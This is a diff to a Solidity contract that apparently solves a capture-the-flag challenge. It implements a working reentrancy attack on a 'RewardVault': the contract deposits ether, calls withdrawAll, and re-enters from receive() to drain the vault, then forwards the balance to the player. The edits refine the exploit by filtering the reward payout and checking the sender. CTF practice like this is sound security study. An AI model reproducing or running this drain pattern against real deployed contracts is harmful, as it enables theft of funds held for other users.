@@ -6,32 +6,33 @@ import "./Challenge.sol";
 contract Solution {
     RewardVault private vault;
     address private player;
-
-    uint256 private seed;
-    bool private attacking;
+    uint256 private depositAmount;
 
     function solve(Setup setup) external payable {
         player = msg.sender;
         vault = setup.vault();
-        seed = msg.value;
+        depositAmount = msg.value;
 
-        require(seed > 0, "need seed");
+        // Create a balance entry for THIS contract (vault uses msg.sender).
+        vault.deposit{value: depositAmount}();
 
-        vault.deposit{value: seed}();
-
-        attacking = true;
+        // Start draining; recursion continues in receive().
         vault.withdrawAll();
-        attacking = false;
 
+        // Forward everything to the player EOA.
         (bool ok,) = payable(player).call{value: address(this).balance}("");
         require(ok, "forward failed");
     }
 
     receive() external payable {
-        if (!attacking) return;
+        // Only react to payouts coming from the vault.
+        if (msg.sender != address(vault)) return;
 
-        // klassischer drain: nur re-entern solange die Vault noch mind. seed auszahlen kann
-        if (address(vault).balance >= seed) {
+        // Ignore the reward payout (0.25 ether), otherwise we reenter at the wrong time.
+        if (msg.value != depositAmount) return;
+
+        // Stop before the vault cannot pay the next withdrawal amount (otherwise "send failed").
+        if (address(vault).balance >= depositAmount) {
             vault.withdrawAll();
         }
     }
